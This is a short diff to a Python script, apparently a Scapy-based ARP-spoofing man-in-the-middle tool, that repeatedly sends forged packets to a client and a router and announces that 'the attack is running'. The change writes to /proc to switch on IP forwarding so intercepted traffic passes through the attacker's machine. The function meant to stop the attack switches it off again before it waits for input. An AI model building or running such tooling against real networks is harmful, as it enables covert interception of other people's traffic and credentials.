@@ -90,17 +90,21 @@ def createPackets():
 
 
 def launch():
+    f = open("/proc/sys/net/ipv4/ip_forward", "w") #enable ip forwarding
+    f.write("1")
+    f.close()
     global t
     t = threading.Timer(1.0, launch)
     t.start()
     sendp(to_client, verbose=0)
-    print("To client:\n"+to_client.show(dump=True))
     sendp(to_router, verbose=0)
-    print("To router:\n"+to_router.show(dump=True))
     print("\nThe attack is running, press ENTER to stop\n")
 
 
 def stop():
+    f = open("/proc/sys/net/ipv4/ip_forward", "w") #disable ip forwarding
+    f.write("0")
+    f.close()
     input()
     print("\nThe attack has succesfully stopped!")
     t.cancel()
